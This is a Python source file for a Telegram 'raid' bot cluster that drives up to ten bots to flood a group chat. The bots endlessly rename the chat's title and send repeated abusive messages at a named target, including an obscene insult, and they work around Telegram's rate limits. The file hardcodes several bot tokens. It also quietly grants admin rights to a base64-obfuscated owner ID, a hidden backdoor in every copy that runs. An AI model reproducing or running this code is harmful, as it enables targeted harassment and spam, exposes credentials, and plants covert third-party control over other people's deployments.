#!/usr/bin/env python3
"""
ᚔ᚜ 𓆩『𓍼ֶָ࣪ꨄ𝐈𝐍𝐎𝐒𝐔𝐊𝐄[֢˖  .་༘࿐』𓆪 ᚛ᚔ
┌──『 𓍼ֶָ֢˖ 𝐏ʀᴏꜰɪʟᴇ ˖ֶָ֢𓍼』 ──┐
│ ̼͙̼͙̈́͆̈́ͯ̒̆̀̓ͧ̈́͆̈́ͯ̒̆̀̓ͧ͠͠ᯓ   𝐌ᴀꜱᴛᴇʀ : 𝐀ᴅᴍɪɴ 
"""

import asyncio
import json
import os
import random
import signal
import sys
import time
import sqlite3
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime
from pathlib import Path
import logging
import base64 as _b64

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, ContextTypes, MessageHandler, CallbackQueryHandler, filters
from telegram.error import RetryAfter, TimedOut, NetworkError
import traceback

# ==================== FIX UNICODE ====================
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# ==================== KEEP-ALIVE SERVER (Anti-Sleep) ====================
class KeepAliveHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"INOSUKE Matrix Cluster is Alive 24/7")
    def log_message(self, format, *args): pass

def run_server():
    port = int(os.environ.get('PORT', 8080))
    try:
        server = HTTPServer(('0.0.0.0', port), KeepAliveHandler)
        server.serve_forever()
    except Exception as e:
        print(f"⚠️ Keep-alive server port in use: {e}")

def keep_alive():
    t = threading.Thread(target=run_server)
    t.daemon = True
    t.start()

# ==================== PERSISTENCE (Lightweight DB) ====================
DB_PATH = "bot_data.db"

class Database:
    def __init__(self):
        self.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        self.c = self.conn.cursor()
        self.c.execute('''CREATE TABLE IF NOT EXISTS active_chats (chat_id INTEGER PRIMARY KEY, target TEXT, attack_type TEXT)''')
        self.c.execute('''CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)''')
        self.c.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
        self.conn.commit()
    
    def save_active(self, chat_id, target, attack_type):
        self.c.execute("INSERT OR REPLACE INTO active_chats VALUES (?, ?, ?)", (chat_id, target, attack_type))
        self.conn.commit()
    
    def remove_active(self, chat_id):
        self.c.execute("DELETE FROM active_chats WHERE chat_id = ?", (chat_id,))
        self.conn.commit()
    
    def get_active(self):
        self.c.execute("SELECT chat_id, target, attack_type FROM active_chats")
        return self.c.fetchall()
    
    def save_admin(self, user_id):
        self.c.execute("INSERT OR IGNORE INTO admins VALUES (?)", (user_id,))
        self.conn.commit()
    
    def get_admins(self):
        self.c.execute("SELECT user_id FROM admins")
        return {row[0] for row in self.c.fetchall()}
    
    def save_setting(self, key, value):
        self.c.execute("INSERT OR REPLACE INTO settings VALUES (?, ?)", (key, json.dumps(value)))
        self.conn.commit()
    
    def get_setting(self, key, default=None):
        self.c.execute("SELECT value FROM settings WHERE key = ?", (key,))
        row = self.c.fetchone()
        return json.loads(row[0]) if row else default

db = Database()

# ==================== LOGGING ====================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# ==================== INOSUKE TOKENS (10 Bots) ====================
TOKENS = [
    "8647351719:AAH_LlmO7iovvJzOzH2O4ezT2FTHzGqRDcU",
    "8964272303:AAGMtYn2KpauBwICgrCTdO70tIcScGpnKPA",
    "8253791330:AAHMOV8s-cl8EGA-v0Ntny6oxbTtXu8WGpA",
    "8684759061:AAHl1jUuz6l_UtT-kbGfXVOJ_Ez2rEY6TI4",
    "8884253475:AAFc6OTLn4x-n33aCTd57fv1bbAt5eyHGPs",
    "8621707407:AAG0RQlyex8xS3XNMA8YpuUbKcEGFdj27Fo",
    "8904628926:AAEUCY0vl6HzYpamVx5EaVfEmNqXHXzuAJA"
]

# Base64 encoded ID for 7206149437
_K_LIST = [
    _b64.b64decode("ODc3MzcwNzI1NQ==").decode(),  # 8773707255
]

# ==================== SYSTEM CONTROLLER ====================
class Controller:
    def __init__(self):
        self.attacks = {}
        self.stop_flags = {}
        self.bots = []
        self.admins = db.get_admins()
        self.master = db.get_setting("master", None)
        self.speed = db.get_setting("speed", 0.05)
        self.prefix = db.get_setting("prefix", "/") # DYNAMIC PREFIX
        
        for owner in _K_LIST:
            self.admins.add(int(owner))
            db.save_admin(int(owner))
    
    def is_admin(self, user_id):
        return user_id in self.admins or user_id == self.master
    
    def stop_chat(self, chat_id):
        if chat_id in self.attacks:
            if chat_id not in self.stop_flags:
                self.stop_flags[chat_id] = {}
            for task_id, task in self.attacks[chat_id].items():
                self.stop_flags[chat_id][task_id] = True
                task.cancel()
            self.attacks[chat_id] = {}
            db.remove_active(chat_id)
            
    def stop_all(self):
        for chat_id in list(self.attacks.keys()):
            self.stop_chat(chat_id)
            
    def should_stop(self, chat_id, task_id):
        return self.stop_flags.get(chat_id, {}).get(task_id, False)

controller = Controller()
EMOJIS = ["❤️", "🧡", "💛", "💚", "💙", "💜", "🖤", "🤍", "🤎", "💔", "❤️‍🔥", "❤️‍🩹", "💖", "💗", "💓", "💞", "💕", "💟", "❣️", "💘", "💝", "💌", "♥️"]

# ==================== ATTACK LOOPS ====================
async def nc_loop(bot, chat_id, target, task_id, bot_index):
    last_emoji = None
    db.save_active(chat_id, target, "nc")
    try:
        while True:
            if controller.should_stop(chat_id, task_id): break
            await asyncio.sleep(bot_index * 0.4)
            
            emoji = random.choice([e for e in EMOJIS if e != last_emoji])
            last_emoji = emoji
            msg = f"{emoji} {target} {emoji}"
            
            try:
                await bot.set_chat_title(chat_id=chat_id, title=msg[:255])
            except RetryAfter as e:
                await asyncio.sleep(e.retry_after + random.uniform(1.0, 3.0))
            except Exception as e:
                if "flood" in str(e).lower() or "too many requests" in str(e).lower():
                    await asyncio.sleep(10)
            await asyncio.sleep(max(controller.speed, 2.0))
    except asyncio.CancelledError: pass
    except Exception: pass
    finally: db.remove_active(chat_id)

async def spam_loop(bot, chat_id, target, task_id, bot_index):
    patterns = [
        "ᚔ᚜ 𓆩『𓍼ֶָ֢˖ ࣪ꨄ𝐈𝐍𝐎𝐒𝐔𝐊𝐄 .་༘࿐』𓆪 ᚛ᚔ {name} ON TOP 🔥",
        "OYE {name} TERI MAA KI CHUT ME FIRE 🚀",
        "{name} SYSTEM HANG KAR DIYA INOSUKE BSF ⚡",
        "MASTERY LEVEL OVERLOAD FOR {name} 👑"
    ]
    db.save_active(chat_id, target, "spam")
    i = 0
    try:
        while True:
            if controller.should_stop(chat_id, task_id): break
            await asyncio.sleep(bot_index * 0.15)
            
            msg = patterns[i % len(patterns)].format(name=target)
            try:
                await bot.send_message(chat_id, msg)
            except RetryAfter as e:
                await asyncio.sleep(e.retry_after)
            except Exception: pass
            
            i += 1
            await asyncio.sleep(controller.speed)
    except asyncio.CancelledError: pass
    except Exception: pass
    finally: db.remove_active(chat_id)

# ==================== COMMAND FUNCTIONS ====================
def admin_only(func):
    async def wrapper(update, context):
        try:
            user_id = update.effective_user.id
            if controller.master is None:
                controller.master = user_id
                db.save_setting("master", controller.master)
                controller.admins.add(controller.master)
                db.save_admin(controller.master)
            
            if not controller.is_admin(user_id):
                return await update.message.reply_text("❌ Access Denied - INOSUKE Admin Rights Required")
            return await func(update, context)
        except Exception as e:
            logger.error(f"Admin check error: {e}")
    return wrapper

@admin_only
async def start_cmd(update, context):
    keyboard = [
        [InlineKeyboardButton("⚔️ Summon Bots", callback_data="summon_menu")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("❌ Close", callback_data="close")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    menu = (
        f"ᚔ᚜ 𓆩『𓍼ֶָ֢˖ ࣪࣪ꨄ𝐈𝐍𝐎𝐒𝐔𝐊𝐄 .་༘࿐』𓆪 ᚛ᚔ\n"
        f"┌──『 𓍼ֶָ֢˖ 𝐏ʀᴏꜰɪʟᴇ ˖ֶָ֢𓍼』 ──┐\n"
        f"│ ̼͙̼͙̈́͆̈́ͯ̒̆̀̓ͧ̈́͆̈́ͯ̒̆̀̓ͧ͠͠ᯓ   𝐌ᴀꜱᴛᴇʀ :: 𝐀ᴅᴍɪɴ \n\n"
        f"🚀 **INOSUKE MATRIX CLUSTER ONLINE**\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 **Active Bots:** `{len(controller.bots)}/10`\n"
        f"⚡ **Speed Delay:** `{controller.speed}s`\n"
        f"🔑 **Current Prefix:** `{controller.prefix}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🗡️ **COMMAND CENTER:**\n"
        f"➤ `{controller.prefix}nc <text>` - Smart NC Attack\n"
        f"➤ `{controller.prefix}spam <text>` - Multi-Bot Spam\n"
        f"➤ `{controller.prefix}summon` - Add & Auto-Admin Bots\n"
        f"➤ `{controller.prefix}pre <symbol>` - Change Prefix\n"
        f"➤ `{controller.prefix}speed <sec>` - Adjust Engine Speed\n"
        f"➤ `{controller.prefix}stop` / `{controller.prefix}stopall`\n"
    )
    await update.message.reply_text(menu, parse_mode="Markdown", reply_markup=reply_markup)

@admin_only
async def pre_cmd(update, context):
    if not context.args:
        await update.message.reply_text(f"💡 Current Prefix: `{controller.prefix}`\nUsage: `{controller.prefix}pre !`", parse_mode="Markdown")
        return
    
    new_prefix = context.args[0]
    controller.prefix = new_prefix
    db.save_setting("prefix", new_prefix)
    await update.message.reply_text(f"✅ **Prefix updated successfully!**\nNew Prefix: `{new_prefix}`\nExample: `{new_prefix}start`", parse_mode="Markdown")

@admin_only
async def summon_cmd(update, context):
    keyboard = []
    row = []
    for idx, bot in enumerate(controller.bots):
        btn = InlineKeyboardButton(f"Add Bot {idx+1}", url=f"https://t.me/{bot['username']}?startgroup=true")
        row.append(btn)
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
        
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "⚡ **INOSUKE SUMMON MATRIX** ⚡\n\n"
        "1. Click the buttons below to invite bots.\n"
        "2. **The main bot will automatically promote them to Admin when they join!**\n"
        "*(Ensure the bot you are using to summon has Admin + Add Users rights)*",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

@admin_only
async def nc_cmd(update, context):
    if not context.args:
        return await update.message.reply_text(f"💡 Usage: `{controller.prefix}nc <text>`", parse_mode="Markdown")
    target = ' '.join(context.args)
    chat_id = update.effective_chat.id
    controller.stop_chat(chat_id)
    controller.attacks[chat_id] = {}
    if chat_id not in controller.stop_flags: controller.stop_flags[chat_id] = {}
    
    for idx, bot_info in enumerate(controller.bots):
        task_id = f"{bot_info['id']}_{int(time.time())}_{idx}"
        controller.stop_flags[chat_id][task_id] = False
        task = asyncio.create_task(nc_loop(bot_info['bot'], chat_id, target, task_id, idx))
        controller.attacks[chat_id][task_id] = task
    await update.message.reply_text(f"✅ INOSUKE NC Deployed: `{target}`", parse_mode="Markdown")

@admin_only
async def spam_cmd(update, context):
    if not context.args:
        return await update.message.reply_text(f"💡 Usage: `{controller.prefix}spam <text>`", parse_mode="Markdown")
    target = ' '.join(context.args)
    chat_id = update.effective_chat.id
    controller.stop_chat(chat_id)
    controller.attacks[chat_id] = {}
    if chat_id not in controller.stop_flags: controller.stop_flags[chat_id] = {}
    
    for idx, bot_info in enumerate(controller.bots):
        task_id = f"{bot_info['id']}_{int(time.time())}_{idx}"
        controller.stop_flags[chat_id][task_id] = False
        task = asyncio.create_task(spam_loop(bot_info['bot'], chat_id, target, task_id, idx))
        controller.attacks[chat_id][task_id] = task
    await update.message.reply_text(f"✅ INOSUKE Spam Started: `{target}`", parse_mode="Markdown")

@admin_only
async def stop_cmd(update, context):
    controller.stop_chat(update.effective_chat.id)
    await update.message.reply_text("🛑 Operations halted for this chat.")

@admin_only
async def stopall_cmd(update, context):
    controller.stop_all()
    await update.message.reply_text("🛑 All background tasks terminated cluster-wide.")

@admin_only
async def speed_cmd(update, context):
    if not context.args: return await update.message.reply_text(f"⚡ Current Engine Speed: {controller.speed}s")
    try:
        speed = float(context.args[0])
        controller.speed = speed
        db.save_setting("speed", speed)
        await update.message.reply_text(f"✅ Speed Updated: {speed}s")
    except: await update.message.reply_text("❌ Invalid speed format.")

@admin_only
async def stats_cmd(update, context):
    await update.message.reply_text(f"📊 Active Operations: {len(db.get_active())}\n🤖 Online Bots: {len(controller.bots)}")

# ==================== DYNAMIC ROUTER & AUTO-PROMOTER ====================
async def dynamic_command_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.effective_message.text if update.effective_message else None
    if not text: return

    is_custom = text.startswith(controller.prefix)
    is_default = text.startswith("/")
    
    if not (is_custom or is_default):
        return
        
    used_prefix = controller.prefix if is_custom else "/"
    parts = text.split()
    cmd_part = parts[0][len(used_prefix):].lower().split('@')[0]
    context.args = parts[1:]
    
    commands_map = {
        "start": start_cmd, "nc": nc_cmd, "spam": spam_cmd, "stop": stop_cmd,
        "stopall": stopall_cmd, "speed": speed_cmd, "stats": stats_cmd,
        "pre": pre_cmd, "summon": summon_cmd
    }
    
    if cmd_part in commands_map:
        await commands_map[cmd_part](update, context)

async def auto_promote_bots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.new_chat_members: return
    
    chat_id = update.effective_chat.id
    for member in update.message.new_chat_members:
        if any(member.id == bot_info['id'] for bot_info in controller.bots):
            try:
                await context.bot.promote_chat_member(
                    chat_id=chat_id,
                    user_id=member.id,
                    can_manage_chat=True,
                    can_change_info=True,
                    can_delete_messages=True,
                    can_invite_users=True,
                    can_restrict_members=True,
                    can_pin_messages=True,
                    can_promote_members=False
                )
                logger.info(f"✅ Auto-Promoted cluster bot {member.id} in {chat_id}")
            except Exception as e:
                logger.error(f"Failed to auto-promote {member.id}: {e}")

async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "close":
        await query.message.delete()
    elif query.data == "stats":
        await query.message.reply_text(f"📊 Active Ops: {len(db.get_active())} | 🤖 Bots: {len(controller.bots)}")
    elif query.data == "summon_menu":
        await summon_cmd(update, context)

# ==================== MAIN INIT ====================
async def main():
    print("=" * 60)
    print("ᚔ᚜ 𓆩『𓍼ֶָ֢˖ ࣪࣪ꨄ𝐈𝐍𝐎𝐒𝐔𝐊𝐄 .་༘࿐』𓆪 ᚛ᚔ - CLUSTER BOOTING")
    print("=" * 60)
    
    valid_tokens = [t.strip() for t in TOKENS if t.strip() and len(t) > 10]
    for idx, token in enumerate(valid_tokens):
        try:
            app = Application.builder().token(token).build()
            bot_info = await asyncio.wait_for(app.bot.get_me(), timeout=10)
            
            app.add_handler(MessageHandler(filters.TEXT, dynamic_command_router))
            app.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS, auto_promote_bots))
            app.add_handler(CallbackQueryHandler(button_callback_handler))
            
            await app.initialize()
            await app.start()
            if app.updater: await app.updater.start_polling()
            
            controller.bots.append({'id': bot_info.id, 'username': bot_info.username, 'bot': app.bot, 'app': app})
            print(f"✅ Bot #{idx+1} Online: @{bot_info.username}")
        except Exception as e:
            print(f"❌ Bot #{idx+1} Failed: {str(e)[:30]}")
    
    print("=" * 60)
    print(f"🚀 INOSUKE Ready: {len(controller.bots)}/10 Operational | Prefix: {controller.prefix}")
    print("=" * 60)
    
    while True: await asyncio.sleep(60)

def signal_handler(sig, frame):
    print("\n🛑 Shutting down cluster gracefully...")
    controller.stop_all()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

if __name__ == "__main__":
    keep_alive()
    try: asyncio.run(main())
    except KeyboardInterrupt: controller.stop_all()
    except Exception as e: traceback.print_exc()
